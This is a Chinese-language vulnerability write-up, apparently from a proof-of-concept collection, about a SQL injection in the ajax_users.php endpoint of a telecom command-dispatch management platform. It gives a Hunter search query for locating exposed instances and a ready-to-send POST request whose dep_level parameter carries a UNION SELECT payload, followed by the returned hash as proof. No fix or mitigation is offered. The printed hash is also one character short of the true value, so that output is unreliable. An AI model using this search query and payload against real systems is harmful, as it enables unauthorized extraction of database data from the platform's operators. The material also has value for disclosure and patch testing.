# 指挥调度平台ajax_users存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度和管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。</font>指挥调度平台ajax_users存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 指挥调度平台

# 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征

![1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74.png](./img/bIUf__mIbiystGtX/1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74-579205.png)

# 四、漏洞复现
```http
POST /app/ext/ajax_users.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123456),0x7e),NULL,NULL,NULL-- -
```

![1715267670568-c3055dcd-a14d-4de9-bdf2-231701685779.png](./img/bIUf__mIbiystGtX/1715267670568-c3055dcd-a14d-4de9-bdf2-231701685779-804715.png)

```http
e10adc3949ba59abbe56e057f20f883
```





> 更新: 2024-05-10 15:30:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qmfywxxk17pr7xs3>